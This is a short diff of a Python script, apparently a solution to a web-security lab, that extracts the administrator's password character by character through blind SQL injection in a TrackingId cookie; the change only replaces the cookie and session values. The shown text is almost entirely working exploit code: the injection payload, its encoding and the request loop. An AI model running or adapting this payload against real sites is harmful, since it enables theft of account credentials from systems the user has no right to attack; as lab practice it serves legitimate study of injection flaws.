@@ -26,8 +26,8 @@ async def getChar(position, url, session):
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
         cookies = {
-            "TrackingId": "NGDLSDZiSdR4eDz7" + sqli_payload_encoded,
-            "session": "VHiFvAX0iQUSDNVVg8RXCqdwsg35F6zF"
+            "TrackingId": "B0AUqqhzPIjbglBP" + sqli_payload_encoded,
+            "session": "eCCE4KeOY143DpYnLW3n2qkEn2Us52YG"
         }
         async with session.get(url, cookies=cookies, ssl=False) as r:
             text = await r.text()
